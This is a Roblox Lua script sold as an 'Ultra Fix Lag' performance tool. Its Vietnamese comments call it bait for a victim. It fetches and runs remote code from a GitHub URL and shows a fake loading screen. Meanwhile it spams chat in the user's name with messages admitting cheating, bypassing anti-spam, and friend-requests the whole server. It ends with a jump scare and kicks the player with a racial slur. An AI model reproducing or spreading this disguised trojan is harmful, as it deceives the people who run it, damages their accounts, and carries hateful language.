-- [[ ULTRA FIX LAG PC 2025 - BY XENO HUB ]] --

local kickReason = "LOL NIGGER STUPID"

-- 1. CHẠY SCRIPT GỐC ĐỂ LÀM MỒI NHỬ
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/hacktao677-svg/Tlong-hub/refs/heads/main/FIX%20LAG%20ROBLOX"))()
end)

-- 2. KHÓA HỆ THỐNG UI & ẨN CHAT (BỊT MẮT NẠN NHÂN)
pcall(function()
    local sg = game:GetService("StarterGui")
    sg:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    sg:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- 3. TẠO MÀN HÌNH LOADING GIẢ
local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local ScreenGui = Instance.new("ScreenGui", PlayerGui)
ScreenGui.Name = "Xeno_System_Lock_Final"
ScreenGui.DisplayOrder = 9999999
ScreenGui.IgnoreGuiInset = true

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.Active = true 

local StatusText = Instance.new("TextLabel", MainFrame)
StatusText.Size = UDim2.new(1, 0, 0, 50)
StatusText.Position = UDim2.new(0, 0, 0.5, -20)
StatusText.BackgroundTransparency = 1
StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
StatusText.TextSize = 22
StatusText.Font = Enum.Font.Code
StatusText.Text = "Xeno Hub: Đang cấu hình lại GPU..."

-- 4. HÀM GỬI TIN NHẮN (BYPASS ANTI-SPAM)
local function Say(msg)
    local randomCode = ""
    local chars = "abc123xyz"
    for i = 1, 6 do
        local r = math.random(1, #chars)
        randomCode = randomCode .. string.sub(chars, r, r)
    end
    local finalMsg = msg .. " // " .. randomCode
    
    local TextChatService = game:GetService("TextChatService")
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local channel = TextChatService.TextChannels.RBXGeneral
        if channel then channel:SendAsync(finalMsg) end
    else
        local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
            chatEvent.SayMessageRequest:FireServer(finalMsg, "All")
        end
    end
end

-- 5. HÀM GỬI KẾT BẠN TOÀN SERVER
local function FriendEveryone()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            pcall(function() game.Players.LocalPlayer:RequestFriendship(player) end)
        end
    end
end

task.spawn(function()
    local isKicking = false
    -- DANH SÁCH SPAM TỰ HỦY CỰC MẠNH
    local messages = {
        "PLS REPORT ME IM CHEATER",
        "ROBLOX LOOK AT YOUR GAME LOL IM CHEATER",
        "HERE IS NO ANTI CHEAT LOL",
        "IM HACK LOL FUCK YOU ROBLOX"
    }

    -- VÒNG LẶP SPAM + KẾT BẠN
    task.spawn(function()
        local msgIndex = 1
        while not isKicking do
            pcall(function() Say(messages[msgIndex]) end)
            msgIndex = (msgIndex % #messages) + 1
            if msgIndex == 1 then FriendEveryone() end 
            task.wait(3.5) -- Delay an toàn để không bị hiện thông báo đỏ
        end
    end)

    -- Hiệu ứng thanh Loading giả chạy 60 giây
    task.spawn(function()
        for i = 1, 100 do
            if isKicking then break end
            StatusText.Text = "Đang áp dụng Patch FPS: " .. i .. "%"
            task.wait(0.6)
        end
        isKicking = true
    end)

    -- Khóa nhân vật
    pcall(function() game.Players.LocalPlayer.Character.PrimaryPart.Anchored = true end)

    repeat task.wait(1) until isKicking

    -- 6. JUMP SCARE (HÉT + CHỚP TẮT)
    local Sound = Instance.new("Sound", game.Workspace)
    Sound.SoundId = "rbxassetid://4835664244" 
    Sound.Volume = 10
    Sound:Play()

    for i = 1, 100 do
        MainFrame.BackgroundColor3 = (i % 2 == 0) and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 0, 0)
        task.wait(0.02)
    end

    -- 7. CÚ CHỐT: KICK VỚI LÝ DO SỈ NHỤC
    game.Players.LocalPlayer:Kick(kickReason)
end)
